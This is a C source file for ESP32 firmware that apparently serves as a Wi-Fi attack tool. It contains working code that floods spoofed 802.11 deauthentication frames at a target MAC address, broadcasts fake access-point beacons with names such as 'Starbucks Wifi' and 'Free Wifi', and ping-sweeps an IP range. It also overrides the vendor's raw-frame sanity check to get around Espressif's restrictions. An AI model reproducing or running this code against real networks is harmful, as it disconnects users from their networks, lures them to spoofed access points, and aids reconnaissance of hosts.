#include <string.h>
#include <math.h>
#include <arpa/inet.h>
#include <freertos/FreeRTOS.h>
#include <freertos/timers.h>
#include <freertos/semphr.h>

#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "ping/ping_sock.h"
#include "attack.h"

static const char* TAG = "Attack";

// This bypass is needed in order to ignore the error checking that Espressif does
// The compiler flag "-zmuldefs" must be enabled in order for this to compile
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

#define BEACON_SA_OFFSET 10
#define BEACON_BSSID_OFFSET 16
#define BEACON_SSID_LENGTH_OFFSET 37
#define BEACON_SSID_OFFSET 38
#define BEACON_SSID_END_OFFSET 38
const uint8_t frame_beacon[] = {
	0x80, 0x00,																// 0-1 Frame Control
	0x00, 0x00,																// 2-3 Duration
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff,				// 4-9 Destination
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00,				// 10-15 Source
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00,				// 16-21 BSS ID
	0x00, 0x00,																// 22-23 Sequence seq[8:11]:frag, seq[0:7]
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	// 24-31 Timestamp
	0x00, 0x00,																// 32-33 Interval
	0x31, 0x04,																// 34-35 Capabilities
	0x00, 0x00, /* SSID GOES HERE */				  // 36-37 Length 0x00:length:content
	0x01, 0x06, 0x82, 0x84,	0x8b, 0x96, 0x0c, 0x12,	// 38-45 Supported Rates
};

#define DEAUTH_SA_OFFSET 10
#define DEAUTH_BSSID_OFFSET 16
const uint8_t frame_deauth[] = {
    0xc0, 0x00,   // 0-1 Frame Control
    0x00, 0x00,   // 2-3 Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // 4-9 Destination
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 10-15 Source
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 16-21 BSS ID
    0x00, 0x00,   // 22-23 Sequence seq[8:11]:frag, seq[0:7]
    0x02, 0x00,   // 24-25 Reason
};

typedef struct {
  ip_addr_t ip;
  uint8_t cidr;
} ip_cidr_t;

TimerHandle_t handle_deauth;
mac_addr_t target_deauth;

TimerHandle_t handle_beacon_spam;

TimerHandle_t handle_scan = NULL;
ip_cidr_t scan_target;
SemaphoreHandle_t scan_sem = NULL;
bool scan_in_progress = false;

// SoftAP should be initialized before running this.
void attack_init() {
  handle_deauth = NULL;
  handle_beacon_spam = NULL;
  scan_sem = xSemaphoreCreateCounting(5, 5);
  ESP_LOGI(TAG, "Initialized");
}

void attack_deinit() {
  ESP_LOGI(TAG, "Unintialized");
}

void send_beacon(const char ssid[], const mac_addr_t sa) {
  uint8_t frame[sizeof(frame_beacon) + strlen(ssid)];

  // Copy initial beacon frame
  memcpy(frame, frame_beacon, BEACON_SSID_LENGTH_OFFSET);
  // Set length of SSID
  frame[BEACON_SSID_LENGTH_OFFSET] = strlen(ssid);
  // Copy the SSID
  memcpy(frame + BEACON_SSID_OFFSET, ssid, strlen(ssid));
  // Copy rest of frame
  memcpy(frame + BEACON_SSID_OFFSET + strlen(ssid), frame_beacon + BEACON_SSID_END_OFFSET, sizeof(frame_beacon) - BEACON_SSID_END_OFFSET);

  // Set the SA and BSSID
  memcpy(frame + BEACON_SA_OFFSET, &sa, sizeof(sa));
  memcpy(frame + BEACON_BSSID_OFFSET, &sa, sizeof(sa));

  esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
  ESP_LOGV(TAG, "Beacon sent");
}

static const char* SPAM_SSIDS[] = {
  "Starbucks Wifi",
  "McDonalds Wifi",
  "Hilton Hotel",
  "Tipton",
  "University Wifi",
  "Free Wifi",
  "FBI Van #5",
  "Yell Penis For Password",
  "Something Stinks",
  "Taco Bell Wifi",
  "Pickles",
  "IveCome4UrPikl",
  "FiveDollarFootLong",
  "Cool NFT Man",
  "BeanieWeenie",
  "PooperScooper"
};

void timer_beacon_spam(TimerHandle_t xTimer) {
  mac_addr_t mac;
  esp_fill_random((void*)&mac, sizeof(mac_addr_t));
  for(int i = 0; i < (sizeof(SPAM_SSIDS) / sizeof(SPAM_SSIDS[0])); i++) {
    mac.o6 = i;
    send_beacon(SPAM_SSIDS[i], mac);
    ESP_LOGV(TAG, "Beacon packet sent");
  }
}

void attack_beacon_spam_start() {
  // TODO: Implement this, idk what I want to do with it yet.
  // Random text SSIDs?
  ESP_LOGI(TAG, "Starting beacon spam");
  if (handle_beacon_spam != NULL) {
    ESP_LOGI(TAG, "Beacon spam already in progress!");
    return;
  }

  handle_beacon_spam = xTimerCreate("Beacon Spam", 100 / portTICK_PERIOD_MS, pdTRUE, 0, timer_beacon_spam);
  xTimerStart(handle_beacon_spam, 0);
  ESP_LOGD(TAG, "Beacon spam timer created, started");
  ESP_LOGI(TAG, "Beacon spam started;");
}

void attack_beacon_spam_stop() {
  ESP_LOGI(TAG, "Stopping beacon spam");
  xTimerStop(handle_beacon_spam, 0);
  xTimerDelete(handle_beacon_spam, 0);
  handle_beacon_spam = NULL;
  ESP_LOGD(TAG, "Beacon spam timer stopped, deleted");
  ESP_LOGI(TAG, "Beacon spam stopped");
}

void send_deauth(const mac_addr_t sa) {
  uint8_t frame[sizeof(frame_deauth)];
  // Copy deauth frame into frame
  memcpy(frame, frame_deauth, sizeof(frame_deauth));
  // Set the SA and BSSID
  memcpy(frame + DEAUTH_SA_OFFSET, &sa, sizeof(sa));
  memcpy(frame + DEAUTH_BSSID_OFFSET, &sa, sizeof(sa));

  esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
  ESP_LOGV(TAG, "Deauth packet sent");
}

void timer_deauth(TimerHandle_t xTimer) {
  // Every time this is called, send the packet 64 times
  for(uint8_t i=0; i < 64; i++) {
    send_deauth(target_deauth);
  }
  ESP_LOGD(TAG, "Deauth timer ran");
}

bool attack_deauth_start(mac_addr_t sa, uint32_t ms) {
  // If there is already a handle, chances are it's already running
  if (handle_deauth != NULL) {
    ESP_LOGI(TAG, "Deauth already in progress!");
    return false;
  }
  target_deauth = sa;
  // Create and start a timer
  handle_deauth = xTimerCreate("Deauth Spam", ms / portTICK_PERIOD_MS, pdTRUE, 0, timer_deauth);
  xTimerStart(handle_deauth, 0);
  ESP_LOGD(TAG, "Deauth timer created, started");
  ESP_LOGI(TAG, "Deauth attack started");
  return true;
}

void attack_deauth_stop() {
  if (handle_deauth == NULL) return;

  xTimerStop(handle_deauth, 0);
  xTimerDelete(handle_deauth, 0);
  handle_deauth = NULL;
  ESP_LOGD(TAG, "Deauth timer stopped, deleted");
  ESP_LOGI(TAG, "Deauth attack stopped");
}

void ping_success(esp_ping_handle_t handle, void* args) {
  ip_addr_t addr;
  esp_ping_get_profile(handle, ESP_PING_PROF_IPADDR, &addr, sizeof(addr));
  ESP_LOGI(TAG, "IP is UP! " IPSTR, IP2STR(&addr.u_addr.ip4));
}

void ping_timeout(esp_ping_handle_t handle, void* args) {
  ip_addr_t addr;
  esp_ping_get_profile(handle, ESP_PING_PROF_IPADDR, &addr, sizeof(addr));
  ESP_LOGI(TAG, "IP is down! " IPSTR, IP2STR(&addr.u_addr.ip4));
}

void ping_end(esp_ping_handle_t handle, void* args) {
  ip_addr_t addr;
  esp_ping_get_profile(handle, ESP_PING_PROF_IPADDR, &addr, sizeof(addr));
  ESP_LOGD(TAG, "Deleting... " IPSTR, IP2STR(&addr.u_addr.ip4));
  esp_ping_delete_session(handle);
  xSemaphoreGive(scan_sem);
}

void increment_ip(ip4_addr_t* ip) {
  uint32_t raw = esp_netif_htonl(ip->addr);
  raw++;
  ip->addr = esp_netif_htonl(raw);
  ESP_LOGV(TAG, "Incrementing " IPSTR, IP2STR(ip));
}

// void task_ip_scan(const ip_addr_t ip, uint8_t cidr) {
void task_ip_scan(TimerHandle_t timer_handle) {
  // 192.168.1.1/24
  // IP:   00000001.00000001.10101000.11000000
  // CIDR: 00000000.11111111.11111111.11111111

  // 192.168.1.1/30
  // IP:   00000001.00000001.10101000.11000000
  // CIDR: 00111111.11111111.11111111.11111111
  if (scan_target.cidr > 32) scan_target.cidr = 32;

  ip_addr_t base_ip = scan_target.ip;
  base_ip.u_addr.ip4.addr &= (0xFFFFFFFF >> (32-scan_target.cidr));

  esp_ping_callbacks_t cbs = {
    .cb_args = NULL,
    .on_ping_success = ping_success,
    .on_ping_timeout = ping_timeout,
    .on_ping_end = ping_end
  };

  esp_ping_handle_t* ping_handle = malloc(sizeof(esp_ping_handle_t) * (1 << (32-scan_target.cidr)));
  for (uint32_t i=0; i < (1 << (32-scan_target.cidr)); i++) {
    xSemaphoreTake(scan_sem, portMAX_DELAY);
    esp_ping_config_t config = ESP_PING_DEFAULT_CONFIG();
    config.timeout_ms = 300;
    config.count = 1;
    config.target_addr = base_ip;
    config.data_size = 32;
    ESP_ERROR_CHECK(esp_ping_new_session(&config, &cbs, &(ping_handle[i])));
    ESP_ERROR_CHECK(esp_ping_start(ping_handle[i]));
    ESP_LOGI(TAG, "Scanning " IPSTR, IP2STR(&base_ip.u_addr.ip4));
    increment_ip(&base_ip.u_addr.ip4);
    if (!scan_in_progress) break; // If scan was stopped, then break out
  }
  free(ping_handle);
  scan_in_progress = false;
  ESP_LOGI(TAG, "IP scan is done!");
}

// Usage:
// ip_addr_t target_addr = {
//     .type = IPADDR_TYPE_V4,
//     .u_addr = {
//         .ip4 = {
//             .addr = ESP_IP4TOADDR(192,168,4,0)
//         }
//     }
// };
// attack_ip_scan_start(target_addr, 24);
void attack_ip_scan_start(const ip_addr_t ip, uint8_t cidr) {
  if (handle_scan != NULL && xTimerIsTimerActive(handle_scan)) return; // If scan is already active, just return
  scan_target.ip = ip;
  scan_target.cidr = cidr;
  handle_scan = xTimerCreate("Scan timer", 1, pdFALSE, 0, task_ip_scan);
  scan_in_progress = true;
  xTimerStart(handle_scan, 0);
}

// If return is 'true', then scan is in progress
bool attack_ip_scan_in_progress() {
  return scan_in_progress;
}

// This will return the status of the ip scan
// This should be called after `attack_ip_scan_status` returns `true`
void attack_ip_scan_stop() {
  ESP_LOGI(TAG, "Stopping IP scan");
  scan_in_progress = false;
  xTimerStop(handle_scan, 0);
  xTimerDelete(handle_scan, 0);
}
